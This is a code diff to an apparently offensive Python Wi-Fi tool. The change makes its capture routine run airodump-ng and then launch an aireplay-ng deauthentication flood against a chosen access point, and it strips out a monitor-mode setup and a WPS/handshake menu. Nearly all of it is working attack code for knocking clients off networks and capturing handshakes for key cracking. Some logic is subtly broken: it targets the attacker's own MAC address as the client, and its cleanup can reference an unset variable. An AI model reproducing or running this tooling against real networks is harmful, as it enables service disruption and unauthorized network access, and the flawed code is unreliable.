@@ -22,13 +22,6 @@ class WifiScan:
     def __init__(self, adapter):
         self.adapter = adapter
 
-    def enable_monitor_mode(self):
-        """Enable monitor mode"""
-        print(f"Changing {self.adapter} to monitor mode")
-        subprocess.run(["ifconfig", self.adapter, "down"])
-        subprocess.run(["iwconfig", self.adapter, "mode", "monitor"])
-        subprocess.run(["ifconfig", self.adapter, "up"])
-
     def deauth_attack(self, client_bssid, deauth_pack, client_mac):
         '''Deauth attack function'''
         print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
@@ -45,48 +38,35 @@ class WifiScan:
         print("Current MAC address:", current_mac)
 
         try:
-            print("[+] Press Control + C to stop scan")
-            airodump_process = subprocess.Popen(['airodump-ng', self.adapter])
-            airodump_process.wait()
-        except KeyboardInterrupt:
-            channel = input("[+] Input channel of Wi-Fi network: ")
-            client_bssid = input("[+] Input client BSSID: ")
-            handshake_file = input("[+] Input handshake file name: ")
+            # Start the capture process in the background
+            capture_process = subprocess.Popen(['airodump-ng', self.adapter])
 
-            subprocess.run([
-                'airodump-ng',
-                '--bssid', client_bssid,
-                '--channel', channel,
-                '--write', handshake_file,
-                self.adapter
-            ])
+            # Wait for user input to execute the deauth attack
+            input("Press Enter to proceed with deauth attack...")
+
+            # Prompt user for deauth attack inputs
+            client_bssid = input("[+] Input client BSSID: ")
+            deauth_pack = int(input("[+] Input number of deauth packets: "))
+            client_mac = getmac.get_mac_address(interface=self.adapter)
+
+            # Execute the deauth attack
+            print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
+            subprocess.run(['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter], check=True)
+
+        except KeyboardInterrupt:
+            print("Capture handshake process stopped.")
+
+        finally:
+            # Cancel the capture process if it was started
+            if capture_process:
+                capture_process.terminate()
+                capture_process.wait()
 
     def run_wifi_scan(self):
-        user_selection = self.get_user_selection()
-
-        if user_selection == '1':
-            try:
-                self.enable_monitor_mode()
-                self.check_wps()
-            except KeyboardInterrupt:
-                pass
-
-        elif user_selection == '2':
-            try:
-                self.capture_handshake()
-            except KeyboardInterrupt:
-                print("Interrupted capture. Proceeding with deauth attack...")
-                client_bssid = input("[+] Input client BSSID: ")
-                deauth_pack = int(input("[+] Input number of deauth packets: "))
-                client_mac = getmac.get_mac_address(interface=self.adapter)
-                self.deauth_attack(client_bssid, deauth_pack, client_mac)
-
-    @staticmethod
-    def get_user_selection():
-        print("[+] Which action do you want to perform:")
-        print("1. Check for WPS")
-        print("2. Capture Handshake")
-        return input("Selection: ")
+        try:
+            self.capture_handshake()
+        except KeyboardInterrupt:
+            pass
 
 
 def main():
